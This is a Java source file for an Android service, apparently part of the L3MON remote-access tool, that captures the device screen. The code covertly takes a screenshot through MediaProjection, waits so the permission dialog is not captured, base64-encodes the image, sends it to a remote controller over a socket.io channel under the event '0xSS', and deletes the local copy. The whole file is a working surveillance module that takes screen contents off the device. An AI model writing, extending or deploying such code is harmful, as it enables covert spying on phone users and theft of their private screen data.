package com.etechd.l3mon;

import android.annotation.SuppressLint;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.PixelFormat;
import android.graphics.Point;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.AsyncTask;
import android.os.Environment;
import android.os.IBinder;
import android.util.Base64;
import android.util.Log;
import android.view.WindowManager;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.nio.ByteBuffer;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

import io.socket.client.Socket;

public class Screenshot extends Service {
    private static final String SCREENCAP_NAME = "screencap";
    private static final int VIRTUAL_DISPLAY_FLAGS = 9;
    private static MediaProjection sMediaProjection;
    public File filePath;
    private int mDensity;
    private int mWidth;
    private int mHeight;
    private ImageReader mImageReader;
    private VirtualDisplay mVirtualDisplay;

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @SuppressLint("NewApi")
    @Override
    public int onStartCommand(Intent intent, int i, int i2) {
        MediaProjection mediaProjection = null;
        mediaProjection = ((MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE)).getMediaProjection(intent.getIntExtra("resultcode", -1), (Intent) intent.getParcelableExtra("android.intent.extra.INTENT"));
        if (mediaProjection == null) {
            Log.e("TAGG", "mprojection is null");
        } else {
            Log.e("TAGG", "mprojection not null");
        }
        sMediaProjection = mediaProjection;
        try {
            Thread.sleep(500); // 防止截屏截到 显示截屏权限的窗口
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
        takeScreenShot(mediaProjection);
        return Service.START_REDELIVER_INTENT;
    }

    @SuppressLint("NewApi")
    public boolean takeScreenShot(final MediaProjection mediaProjection) {
        mDensity = getResources().getDisplayMetrics().densityDpi;
        Point point = new Point();
        ((WindowManager) getSystemService(Context.WINDOW_SERVICE)).getDefaultDisplay().getRealSize(point);
        mWidth = point.x;
        mHeight = point.y;

        //start capture reader
        mImageReader = ImageReader.newInstance(mWidth, mHeight, PixelFormat.RGBA_8888, 2);
        mVirtualDisplay = mediaProjection.createVirtualDisplay(SCREENCAP_NAME, mWidth, mHeight, mDensity, DisplayManager.VIRTUAL_DISPLAY_FLAG_OWN_CONTENT_ONLY | DisplayManager.VIRTUAL_DISPLAY_FLAG_PUBLIC, mImageReader.getSurface(), null, null);

        mImageReader.setOnImageAvailableListener(new ImageReader.OnImageAvailableListener() {
            @Override
            public void onImageAvailable(final ImageReader reader) {
                Log.e("PTDEBUG", "new image");
                sMediaProjection.stop();

                new AsyncTask<Void, Void, Bitmap>() {

                    @Override
                    protected Bitmap doInBackground(Void... voids) {
                        Image image = null;
                        FileOutputStream fos = null;
                        Bitmap bitmap = null;

                        try {
                            image = reader.acquireLatestImage();
                            if (image != null) {
                                Image.Plane[] planes = image.getPlanes();
                                ByteBuffer buffer = planes[0].getBuffer();
                                int pixelStride = planes[0].getPixelStride();
                                int rowStride = planes[0].getRowStride();
                                int rowPadding = rowStride - pixelStride * mWidth;

                                bitmap = Bitmap.createBitmap(mWidth + rowPadding / pixelStride,
                                        mHeight, Bitmap.Config.ARGB_8888);
                                bitmap.copyPixelsFromBuffer(buffer);

                                filePath = getFilePath();
                                fos = new FileOutputStream(filePath);
                                bitmap.compress(Bitmap.CompressFormat.JPEG, 100, fos);
                                return bitmap;
                            }
                        } catch (Exception e) {
                            if (bitmap != null) {
                                bitmap.recycle();
                            }
                            e.printStackTrace();
                        }
                        if (image != null) {
                            image.close();
                        }
                        reader.close();
                        return null;
                    }

                    @Override
                    public void onPostExecute(Bitmap bitmap) {
                        super.onPostExecute(bitmap);
                        Log.d("TAGG", new StringBuffer().append("Got bitmap?").append(bitmap != null).toString());
                        send(filePath);
                        if (mVirtualDisplay != null) {
                            mVirtualDisplay.release();
                        }
                        stopSelf();
                    }

                }.execute();

            }
        }, null);
        mediaProjection.registerCallback(new MediaProjection.Callback() {
            @Override
            public void onStop() {
                super.onStop();
                if (mVirtualDisplay != null) {
                    mVirtualDisplay.release();
                }
                if (mImageReader != null) {
                    mImageReader.setOnImageAvailableListener(null, null);
                }
                sMediaProjection.unregisterCallback(this);

            }
        }, null);

        return true;
    }

    private boolean send(File file) {
        if (file == null) {
            Log.d("TAGG", "send() file null");
        }
        try {
            Bitmap decodeFile = BitmapFactory.decodeFile(file.getAbsolutePath());
            if (decodeFile == null) {
                return false;
            }
            Log.d("TAGG", "bitmap " + file.getAbsolutePath());
            if (decodeFile != null) {
                ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
                decodeFile.compress(Bitmap.CompressFormat.PNG, 100, byteArrayOutputStream);
                String encodeToString = Base64.encodeToString(byteArrayOutputStream.toByteArray(), 0);
                JSONObject jSONObject = new JSONObject();
                jSONObject.put("image", true);
                jSONObject.put("name", file.getName());
                jSONObject.put("buffer", encodeToString);
                Socket ioSocket = IOSocket.getInstance().getIoSocket();
                Object[] objArr = new Object[1];
                objArr[0] = jSONObject;
                ioSocket.emit("0xSS", objArr);
                file.delete();
            }
        } catch (JSONException e) {
            e.printStackTrace();
        }
        return true;
    }

    public static File getFilePath() {
        File file = null;
        String mSamplePath = null;
        SimpleDateFormat simpleDateFormat = new SimpleDateFormat("yyyy_mm_dd_hh_mm", Locale.getDefault());
        if (Environment.getExternalStorageState().equals("mounted")) {
//            mSamplePath = Environment.getExternalStoragePublicDirectory(File.separator).getAbsolutePath();
            mSamplePath = MainService.getContextOfApplication().getExternalCacheDir().getPath();
        } else {
            mSamplePath = MainService.getContextOfApplication().getCacheDir().getPath();
        }
        file = new File(mSamplePath + "/screenshot_" + simpleDateFormat.format(new Date()) + ".png");
        return file;
    }
}
